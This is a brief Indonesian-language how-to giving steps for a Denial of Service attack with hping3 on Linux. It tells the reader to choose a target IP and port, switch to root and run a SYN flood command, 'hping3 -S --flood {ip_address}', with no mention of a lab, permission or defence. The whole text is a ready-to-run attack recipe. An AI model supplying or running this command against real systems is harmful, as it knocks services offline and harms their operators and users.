## Langkah-langkah melakukan DoS (Denial of Service) menggunakan hping3 (linux)
* Tentukan ip target dan port yang akan dilakukan DoS
* Buka terminal dan masuk ke mode root
* Selanjutnya masukan perintah berikut untuk menjalankan SYN Flooding Attack, Cth:
```bash
hping3 -S --flood {ip_address}
```
